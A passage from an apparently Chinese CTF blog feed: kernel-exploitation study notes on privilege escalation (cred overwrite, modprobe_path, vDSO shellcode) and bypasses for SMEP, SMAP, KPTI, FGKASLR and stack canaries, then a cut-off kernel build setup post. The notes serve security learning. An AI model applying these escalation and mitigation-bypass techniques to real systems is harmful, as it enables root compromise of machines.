<code>post-init read-only</code> 的数据，即将初始化后不再被写的数据标记为只读，来防御这样的利用</p><ul><li><p>定位 <code>vDSO</code></p><ul><li><p><code>IDA</code>在<code>vmlinux</code>里定位<code>vDSO</code></p><p>点击<code>init_vdso函数 -&gt; vdso_image_64 / vdso_image_x32 -&gt; raw_data</code></p><p>或直接使用<code>raw_data</code>来寻找<code>vDSO</code></p></li><li><p>内存中定位</p><p>直接定位：<code>vDSO</code>是一个<code>ELF</code>文件，有<code>ELF</code>文件头，<code>vDSO</code>特定位置存储导出函数的字符串，根据这两个特征扫描内存</p><p><code>vDSO</code>相对内核基址偏移固定，先获取内核基址再根据偏移得到地址</p></li></ul></li><li><p>修改 <code>vDSO</code> 的特定函数为指定的 <code>shellcode</code></p></li><li><p>等待触发执行 <code>shellcode</code></p></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h5 id="改变自身-1"><a href="#改变自身-1" class="headerlink" title="改变自身"></a>改变自身</h5><ul><li>改<code>cred</code>结构体：扫描内存定位&#x2F;<code>task_struct</code>结构体存放<code>cred</code>结构体指针&#x2F;<code>comm</code>偏移定位<code>cred</code>结构体位置，通过任意地址写&#x2F;<code>rop</code>来改<code>cred</code>中的<code>uid-fsgid</code>为<code>0</code></li><li>改<code>cred</code>结构体指针：<code>task_struct</code>结构体存放<code>cred</code>结构体指针&#x2F;<code>comm</code>偏移定位<code>cred</code>结构体指针位置，能够直接修改 <code>cred</code> 指针以及知道有<code>root</code>权限的 <code>init_cred</code> 地址时，修改 <code>cred</code> 指针为内核镜像中已有的<code> init_cred</code> 的地址</li><li><code>UAF</code> 使用同样堆块控制<code>cred</code>结构体-过时</li><li><code>commit_creds(&amp;init_cred)</code>，传入有<code>root</code>权限的<code>init_cred</code>的地址</li><li><code>commit_creds(prepare_kernel_cred(0))</code>-<code>6.2</code>之后失效</li></ul><h5 id="改变别人-1"><a href="#改变别人-1" class="headerlink" title="改变别人"></a>改变别人</h5><ul><li>修改<code>modprobe_path</code>为指定程序之后触发 <code>call_modprobe</code></li><li>修改 <code>poweroff_cmd</code> 为指定的程序之后触发<code>__orderly_poweroff</code></li><li>写<code>vDSO</code>为<code>shellcode</code></li></ul><h3 id="泄露敏感信息"><a href="#泄露敏感信息" class="headerlink" title="泄露敏感信息"></a>泄露敏感信息</h3><p>需要我们具有读取内核数据的能力，具体想要泄漏什么数据与利用场景紧密相关</p><h3 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h3><p>即使得内核崩溃</p><ul><li>触发内核中的某个<strong>漏洞</strong>让内核崩溃</li><li>触发内核中的<strong>死锁</strong></li><li>触发<strong>大量的内核内存泄漏</strong>，即存在大量的内存被申请但是没有被释放</li></ul><h2 id="内核防御机制"><a href="#内核防御机制" class="headerlink" title="内核防御机制"></a>内核防御机制</h2><h3 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h3><h4 id="内核态和用户态的隔离"><a href="#内核态和用户态的隔离" class="headerlink" title="内核态和用户态的隔离"></a>内核态和用户态的隔离</h4><h5 id="默认"><a href="#默认" class="headerlink" title="默认"></a>默认</h5><p><strong>用户态</strong>不可直接<strong>访问</strong>内核态的<strong>数据</strong>、执行内核态的<strong>代码</strong></p><h5 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h5><p><strong>内核态</strong>不可<strong>执行</strong>用户态的代码&#x2F;用户代码不可执行，位于<code>cr4</code>的第<code>20</code>位，不开的话会导致攻击者控制了内核中的执行流，就可以执行处于用户态的代码，由于用户态的代码是攻击者可控的，所以更容易实施攻击</p><p><strong>开启</strong>：默认开启，<code>qemu</code>开启在启动时加<code>-append +smep</code></p><p><strong>关闭</strong>：<code>/etc/default/grub</code>中如下两行添加<code>nosmep</code>，运行<code>update-grub</code>并重启系统，<code>qemu</code>中加<code>-append nosmep</code></p><pre class="line-numbers language-none"><code class="language-none">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet&quot;  GRUB_CMDLINE_LINUX&#x3D;&quot;initrd&#x3D;&#x2F;install&#x2F;initrd.gz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>状态查看</strong>：存在<code>smep</code>字符即开启了<code>smep</code>保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> smep /proc/cpuinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>攻击</strong>：内核中存在固定的修改<code>cr4</code>的代码，比如<code>refresh_pce</code>函数、<code>set_tsc_mode</code>函数，或者控制程序流后执行内核中的<code>gadget</code>修改，将<code>CR4</code>寄存器第<code>20</code>位置<code>0</code>后即关闭<code>smep</code>，一般将<code>CR4</code>设置位<code>0x6f0</code>，这样同时也关闭了<code>smap</code></p><h5 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h5><p><strong>内核态</strong>不可<strong>访问</strong>用户态的数据&#x2F;用户数据不可访问，位于<code>cr4</code>的第<code>21</code>位，不开<code>smap</code>可能导致攻击者可以通过栈迁移将栈迁移到用户态，然后进行 <code>ROP</code></p><p><strong>开启&#x2F;关闭&#x2F;状态查看</strong>：同上</p><p><strong>攻击</strong>：设置<code>rc4</code>同上，劫持程序流之后可以调用 <code>copy_from_user</code> 和 <code>copy_to_user</code> 来访问用户态的内存。这两个函数会临时清空禁止访问用户态内存的标志</p><h5 id="KPTI-Kernel-Page-Table-Isolation"><a href="#KPTI-Kernel-Page-Table-Isolation" class="headerlink" title="KPTI-Kernel Page Table Isolation"></a>KPTI-Kernel Page Table Isolation</h5><p><strong>用户态</strong>不可看到内核态的<strong>页表</strong>；<strong>内核态</strong>不可<strong>执行用户</strong>态的<strong>代码</strong>,进一步增强了用户态和内核态内存的隔离，在开启 <code>KPTI</code> 机制后，用户态进入内核态或内核态进入用户态时都会进行页表切换</p><ul><li>内核态页表：用户空间内存的页表（标记为不可执行，类似<code>smep</code>，未开启<code>smap</code>则仍然可以访问用户态空间内存，只是不能执行<code>shellcode</code>）+内核空间内存的页表</li><li>用户态的页表：用户空间内存的页表+必要的内核空间内存的页表（如用于处理系统调用、中断等信息的内存</li></ul><p><code>Linux 4.15</code> 中引入了 <code>KPTI </code>机制，并且该机制被反向移植到了 <code>Linux 4.14.11</code>，<code>4.9.75，4.4.110</code></p><p><strong>开启：</strong><code>-append kpti=1</code></p><p><strong>关闭</strong>：<code>-append nopti</code></p><p><strong>状态查看</strong>：<code>dmesg | grep &#39;page table&#39;</code></p><p><strong>攻击</strong>：<code>KPTI</code> 机制和 <code>SMAP 、SMEP</code> 不太一样，由于与源码紧密结合，似乎没有办法在运行时刻关闭</p><ul><li><p>修改页表</p><p>用户态空间所有数据被标记了<code>NX</code>，可以修改对应页表权限，未开<code>smep</code>修改后可以返回到用户态执行用户态代码</p></li><li><p><code>SWITCH_TO_USER_CR3_STACK</code></p><p>控制内核执行返回用户态时执行的切换页表代码判断也可以正常返回到用户态，页表切换主要靠<code>SWITCH_TO_USER_CR3_STACK</code>汇编宏，只要能调用这部分代码即可进行页表切换</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.macro SWITCH_TO_USER_CR3_STACK scratch_reg:req    pushq   %rax    SWITCH_TO_USER_CR3_NOSTACK scratch_reg&#x3D;\scratch_reg scratch_reg2&#x3D;%rax    popq    %rax.endm.macro SWITCH_TO_USER_CR3_NOSTACK scratch_reg:req scratch_reg2:req    ALTERNATIVE &quot;jmp .Lend_\@&quot;, &quot;&quot;, X86_FEATURE_PTI    mov %cr3, \scratch_reg    ALTERNATIVE &quot;jmp .Lwrcr3_\@&quot;, &quot;&quot;, X86_FEATURE_PCID    &#x2F;*     * Test if the ASID needs a flush.     *&#x2F;    movq    \scratch_reg, \scratch_reg2    andq    $(0x7FF), \scratch_reg      &#x2F;* mask ASID *&#x2F;    bt  \scratch_reg, THIS_CPU_user_pcid_flush_mask    jnc .Lnoflush_\@    &#x2F;* Flush needed, clear the bit *&#x2F;    btr \scratch_reg, THIS_CPU_user_pcid_flush_mask    movq    \scratch_reg2, \scratch_reg    jmp .Lwrcr3_pcid_\@.Lnoflush_\@:    movq    \scratch_reg2, \scratch_reg    SET_NOFLUSH_BIT \scratch_reg.Lwrcr3_pcid_\@:    &#x2F;* Flip the ASID to the user version *&#x2F;    orq $(PTI_USER_PCID_MASK), \scratch_reg.Lwrcr3_\@:    &#x2F;* Flip the PGD to the user version *&#x2F;    orq     $(PTI_USER_PGTABLE_MASK), \scratch_reg    mov \scratch_reg, %cr3.Lend_\@:.endm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页表切换后还要返回到用户态，需要复用内核中返回至用户态的代码，主要有两种方式：<code>iret</code>和<code>sysret</code></p><ul><li><p><code>iret</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)#ifdef CONFIG_DEBUG_ENTRY    &#x2F;* Assert that pt_regs indicates user mode. *&#x2F;    testb   $3, CS(%rsp)    jnz 1f    ud21:#endif    POP_REGS pop_rdi&#x3D;0    &#x2F;*     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.     * Save old stack pointer and switch to trampoline stack.     *&#x2F;    movq    %rsp, %rdi    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp    UNWIND_HINT_EMPTY    &#x2F;* Copy the IRET frame to the trampoline stack. *&#x2F;    pushq   6*8(%rdi)   &#x2F;* SS *&#x2F;    pushq   5*8(%rdi)   &#x2F;* RSP *&#x2F;    pushq   4*8(%rdi)   &#x2F;* EFLAGS *&#x2F;    pushq   3*8(%rdi)   &#x2F;* CS *&#x2F;    pushq   2*8(%rdi)   &#x2F;* RIP *&#x2F;    &#x2F;* Push user RDI on the trampoline stack. *&#x2F;    pushq   (%rdi)    &#x2F;*     * We are on the trampoline stack.  All regs except RDI are live.     * We can do future final exit work right here.     *&#x2F;    STACKLEAK_ERASE_NOCLOBBER    SWITCH_TO_USER_CR3_STACK scratch_reg&#x3D;%rdi    &#x2F;* Restore RDI. *&#x2F;    popq    %rdi    SWAPGS    INTERRUPT_RETURN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>伪造如下栈跳转到<code>movq %rsp, %rdi</code>就可以切换页表并且返回至用户态</p><pre class="line-numbers language-none"><code class="language-none">fake raxfake rdiRIPCSEFLAGSRSPSS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>sysret</code></p><p><code>rcx</code>、<code>r11</code>取值</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">rcx, save the rip of the code to be executed when returning to userspacer11, save eflags<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造栈</p><pre class="line-numbers language-none"><code class="language-none">fake rdirsp, the stack of the userspace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>跳转<code>entry_SYSCALL_64</code>的如下部分即可返回到用户态</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">SWITCH_TO_USER_CR3_STACK scratch_reg&#x3D;%rdi    popq    %rdi    popq    %rsp    swapgs    sysretq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>signal handler</code></p><p>在用户态注册<code>signal handler</code>来执行用户态的代码，无需切换页表</p></li></ul><h4 id="内核自身内部不同对象间的隔离"><a href="#内核自身内部不同对象间的隔离" class="headerlink" title="内核自身内部不同对象间的隔离"></a>内核自身内部不同对象间的隔离</h4><h5 id="堆块隔离"><a href="#堆块隔离" class="headerlink" title="堆块隔离"></a>堆块隔离</h5><h6 id="GFP-KERNEL-amp-GFP-KERNEL-ACCOUNT-的隔离"><a href="#GFP-KERNEL-amp-GFP-KERNEL-ACCOUNT-的隔离" class="headerlink" title="GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离"></a>GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离</h6><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code>。</p><p>在 <code>5.9</code> 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，自内核版本 5.14 起又重新引入：</p><ul><li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 <code>kernel</code> 而言（默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离。</li></ul><h6 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h6><p>如果在使用 <code>kmem_cache_create</code> 创建一个 <code>cache</code> 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 <code>cache</code> 就会单独存在，不会与其它相同大小的 <code>cache</code> 合并。在早期，许多结构体（如 <strong><code>cred</code> 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 <code>cache</code>。在 <code>Linux 4.5</code> 版本引入了这个 <code>flag</code> 后，许多结构体就单独使用了自己的 <code>cache</code></p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>使得内核中相应的对象具有一定的访问控制要求，比如不可写，或者不可读</p><h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h4><h5 id="dmesg-restrict"><a href="#dmesg-restrict" class="headerlink" title="dmesg_restrict"></a>dmesg_restrict</h5><p>内核日志有一些地址信息或者敏感信息，因此对<strong>内核日志</strong>的访问进行限制</p><p>该选项用于控制是否可以使用 <code>dmesg</code> 来<strong>查看内核日志</strong>。当 <code>dmesg_restrict</code> 为<code>0</code>时，没有任何限制；当该选项为 1 时，只有具有 <code>CAP_SYSLOG</code> 权限的用户才可以通过 <code>dmesg</code> 命令来查看内核日志</p><h5 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h5><p>在<strong>输出内核地址</strong>时施加的限制，主要限制通过 <code>/proc</code> 获取的内核地址</p><p>选项配置:</p><ul><li><code>0</code>：默认情况下，没有任何限制</li><li><code>1</code>：使用 <code>％pK</code> 输出的内核指针地址将被替换为 <code>0</code>，除非用户具有 <code>CAP_ SYSLOG</code> 特权，并且 <code>group id</code> 和真正的 <code>id</code> 相等</li><li><code>2</code>：使用 <code>％pK</code> 输出的内核指针都将被替换为 <code>0</code> ，<strong>与权限无关</strong></li></ul><p>当开启该保护后，攻击者就不能通过 <code>/proc/kallsyms</code> 来获取内核中某些敏感的地址了，如 <code>commit_creds</code>、<code>prepare_kernel_cred</code></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="ro-after-init"><a href="#ro-after-init" class="headerlink" title="__ro_after_init"></a>__ro_after_init</h5><p>使用 <code>__ro_after_init</code> 标记在 <code>__init</code> 阶段被初始化且初始化后就不会改变的内存，在 <code>init</code> 阶段结束后，不能够被再次修改</p><p>我们可以使用 <code>set_memory_rw(unsigned long addr, int numpages)</code> 来修改对应页的权限</p><h5 id="mmap-min-addr"><a href="#mmap-min-addr" class="headerlink" title="mmap_min_addr"></a>mmap_min_addr</h5><p><code>mmap_min_addr</code> 是用来对抗 <code>NULL Pointer Dereference</code> 的，指定用户进程通过 <code>mmap</code> 可以使用的最低的虚拟内存地址</p><h3 id="异常检测"><a href="#异常检测" class="headerlink" title="异常检测"></a>异常检测</h3><h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p><strong>开启</strong>：开启编译选项<code>CONFIG_CC_STACKPROTECTOR</code></p><p><strong>关闭</strong>：重新编译内核，并关闭编译选项</p><p><strong>状态检查</strong>：<code>checksec</code></p><p><strong>特点</strong>：<code>x86</code> 架构下同一个 <code>task</code> 共享 <code>Canary</code></p><p><strong>攻击</strong>：只要泄露一次系统调用中的<code>canary</code>，同一<code>task</code>的其他系统调用中的<code>canary</code>就都被泄露了</p><h3 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h3><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>内核的代码段基地址等地址会整体偏移</p><p><strong>开启</strong>：<code>-append kaslr</code></p><p><strong>关闭</strong>：<code>-append nokaslr</code></p><p><strong>攻击</strong>：泄露某个段的地址得到该段的基址</p><h4 id="FGKASLR"><a href="#FGKASLR" class="headerlink" title="FGKASLR"></a>FGKASLR</h4><p>在<code>KASLR</code>基础上，在加载时刻以函数粒度重新排布内核代码</p><p><strong>特点</strong>：<code>.text</code>参与随机化，<code>.data</code>不参与随机化</p><p><strong>开启</strong>:开启<code>CONFIG_FG_KASLR=y</code>选项</p><p><strong>关闭</strong>：<code>nokaslr</code>会同时关闭<code>FGKASLR</code>，也可以单独使用<code>nofgkaslr</code></p><p><strong>缺点</strong>：</p><ul><li>函数粒度随机化，如果函数内的某个地址知道了，函数内部的相对地址也就知道了</li><li><code>.text</code>节区不参与函数随机化，一旦知道其中的某个地址，就可以获取该节区所有的地址。系统调用的入口代码都在该节区内，且该节区具有以下 <code>gadget</code><ul><li><code>swapgs_restore_regs_and_return_to_usermode</code>，用于绕过 KPTI 防护</li><li><code>memcpy</code> 内存拷贝</li><li><code>sync_regs</code>，可以把 <code>RAX</code> 放到 <code>RDI</code> 中</li></ul></li><li><code>__ksymtab</code>相对于内核镜像的偏移是固定的，如果我们可以泄露数据，那就可以泄露出其它的符号地址，如 <code>prepare_kernel_cred</code>、<code>commit_creds</code><ul><li>基于内核镜像地址获取 <code>__ksymtab</code> 地址</li><li>基于 <code>__ksymtab</code> 获取对应符号记录项的地址</li><li>根据符号记录项中具体的内容来获取对应符号的地址</li></ul></li><li><code>data</code> 节区相对于内核镜像的偏移是固定的。因此在获取了内核镜像的基地址后，就可以计算出数据区数据的地址，这个节区有一些重要数据比如<code>modprobe_path</code></li></ul><p><code>__ksymtab</code> 格式</p><p><code>__ksymtab</code> 中每个记录项的名字的格式为 <code>__ksymtab_func_name</code>，以 <code>prepare_kernel_cred</code> 为例，对应的记录项的名字为<code>__ksymtab_prepare_kernel_cred</code>，因此，我们可以直接通过该名字在 IDA 里找到对应的位置，如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__ksymtab:FFFFFFFF81F8D4FC __ksymtab_prepare_kernel_cred dd 0FF5392F4h__ksymtab:FFFFFFFF81F8D500                 dd 134B2h__ksymtab:FFFFFFFF81F8D504                 dd 1783Eh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>__ksymtab</code> 每一项的结构为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">kernel_symbol</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> value_offset<span class="token punctuation">;</span>    <span class="token keyword">int</span> name_offset<span class="token punctuation">;</span>    <span class="token keyword">int</span> namespace_offset<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个表项记录了重定位表项相对于当前地址的偏移。那么，<code>prepare_kernel_cred</code> 的地址应该为 <code>0xFFFFFFFF81F8D4FC-(2**32-0xFF5392F4)=0xffffffff814c67f0</code></p><p>即<code>__ksymtab_prepare_kernel_cred addr - (2 ** 32 - __ksymtab_prepare_kernel_cred)</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text.prepare_kernel_cred:FFFFFFFF814C67F0                 public prepare_kernel_cred.text.prepare_kernel_cred:FFFFFFFF814C67F0 prepare_kernel_cred proc near           ; CODE XREF: sub_FFFFFFFF814A5ED5+52↑p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode">https://ctf-wiki.org/pwn/linux/kernel-mode</a></p><p><a href="https://www.z1r0.top/2021/11/21/kernel-pwn%EF%BC%88%E4%B8%89%EF%BC%89%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/#%E7%BC%BA%E7%82%B9">https://www.z1r0.top/2021/11/21/kernel-pwn%EF%BC%88%E4%B8%89%EF%BC%89%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6/#%E7%BC%BA%E7%82%B9</a></p><p><a href="https://www.z1r0.top/2021/10/29/kernel-pwn%EF%BC%88%E4%BA%8C%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#/">https://www.z1r0.top/2021/10/29/kernel-pwn%EF%BC%88%E4%BA%8C%EF%BC%89%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#/</a></p>]]></content>
      
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel环境配置</title>
      <link href="/2024/03/09/kernel-huan-jing-pei-zhi/kernel-huan-jing-pei-zhi/"/>
      <url>/2024/03/09/kernel-huan-jing-pei-zhi/kernel-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<p>记录一下配置kernel环境过程中遇到的一些问题</p><h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><h3 id="内核下载"><a href="#内核下载" class="headerlink" title="内核下载"></a>内核下载</h3><p>网上一些文章用的清华源，但是现在好像…</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-cn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>我们检测到您所在的子网和/或所使用的客户端存在大量下载某些较大二进制文件的行为，为保证用户的正常使用，我们阻断了此类请求。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以网上找到了其他下载<a href="https://cdn.kernel.org/pub/linux/kernel/v5.x/#/%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%9B%A0%E4%B8%BA%E6%84%9F%E8%A7%89%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%A5%BD%E6%85%A2%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%9C%A8%60windows%60%E4%B8%8A%E4%B8%8B%E8%BD%BD%E4%BA%86%E6%8B%96%E8%BF%9B%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BA%86">https://cdn.kernel.org/pub/linux/kernel/v5.x/#/，不过因为感觉下载的好慢，直接在`windows`上下载了拖进虚拟机了</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-O</span> <span class="token parameter variable">-L</span> https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.4.98.tar.xzunxz linux-5.4.98.tar.xz<span class="token function">tar</span> <span class="token parameter variable">-xf</span> linux-5.4.98.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样就得到了内核源码，因为长期版稳定便于学习所以选择了<code>5.4.98</code>版本的内核</p><h3 id="内核编译"><a href="#内核编译" class="headerlink" title="内核编译"></a>内核编译</h3><p>直接<code>make</code>报错了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  linux-5.4.98  <span class="token function">sudo</span> <span class="token function">make</span> menuconfig                                                     <span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> starrysky 的密码：   LEX     scripts/kconfig/lexer.lex.c/bin/sh: <span class="token number">1</span>: flex: not foundmake<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>: *** <span class="token punctuation">[</span>scripts/Makefile.host:9：scripts/kconfig/lexer.lex.c<span class="token punctuation">]</span> 错误 <span class="token number">127</span>make: *** <span class="token punctuation">[</span>Makefile:590：menuconfig<span class="token punctuation">]</span> 错误 <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要先安装<code>flex</code>和<code>bison</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> flex<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> bison<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进入菜单，在菜单中选择<code>Kernel hacking -&gt; Compile-time checks and compiler options</code>并且勾选<code>Compile the kernel with debug info</code>，全选<code>Kernel debugging</code>中全部内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">☁  linux-5.4.98  <span class="token function">sudo</span> <span class="token function">make</span> menuconfig       <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开始编译内核</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">make</span> <span class="token parameter variable">-j</span> <span class="token number">4</span>  bzImage<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中会遇到一些问题，解决方法：</p><ul><li><p><code>.config</code> 第<code>9868</code>行置空（不删除此行</p><pre class="line-numbers language-none"><code class="language-none">CONFIG_SYSTEM_TRUSTED_KEYS&#x3D;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>安装<code>libelf-dev</code>和<code>dwarves</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libelf-dev<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> dwarves<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>最后显示如下内容表示编译成功</p><pre class="line-numbers language-none"><code class="language-none">Setup is 18044 bytes (padded to 18432 bytes).System is 15045 kBCRC 815d9126Kernel: arch&#x2F;x86&#x2F;boot&#x2F;bzImage is ready  (#2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在编译成功后，我们一般主要关注于如下的文件</p><ul><li><code>bzImage</code>：<code>arch/x86/boot/bzImage</code></li><li><code>vmlinux</code>：源码所在的根目录下。</li></ul><p>常见内核文件的介绍:</p><ul><li><strong>bzImage</strong>：目前主流的 <code>kernel</code> 镜像格式，适用于较大的（<code>&gt; 512 KB</code>） <code>Kernel</code>。这个镜像会被加载到内存的高地址(高于 <code>1MB</code>)。<code>bzImage</code> 是用 <code>gzip</code> 压缩的，不能用 <code>gunzip</code> 来解压</li><li><strong>zImage</strong>：比较老的 <code>kernel</code> 镜像格式，适用于较小的<code>Kernel</code>。启动时，这个镜像会被加载到内存的低地址，即内存的前 <code>640 KB</code>。<code>zImage</code> 也不能用 <code>gunzip</code> 来解</li><li><strong>vmlinuz</strong>：<code>vmlinuz</code> 不仅包含了压缩后的 <code>vmlinux</code>，还包含了 <code>gzip</code> 解压缩的代码。实际上就是 <code>zImage</code> 或者 <code>bzImage</code> 文件。该文件是 <code>bootable</code> 的,即它能够把内核加载到内存中。对于 <code>Linux</code> 系统而言，该文件位于 <code>/boot</code> 目录下,该目录包含了启动系统时所需要的文件</li><li><strong>vmlinux</strong>：静态链接的 <code>Linux kernel</code>，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 <code>vmlinuz</code> 的过程中产生的。该文件适合调试,但不是 bootable </li><li><strong>vmlinux.bin</strong>：也是静态链接的 <code>Linux kernel</code>，只是以一个可启动的 (<code>bootable</code>) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li><li><strong>uImage</strong>：<code>uImage</code> 是 <code>U-boot</code> 专用的镜像文件，它是在 <code>zImage</code> 之前加上了一个长度为 <code>0x40</code> 的 <code>tag</code> 而构成的。这个 <code>tag</code> 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息</li></ul><h3 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h3><p><code>c</code>语言源码<code>pwn.c</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token 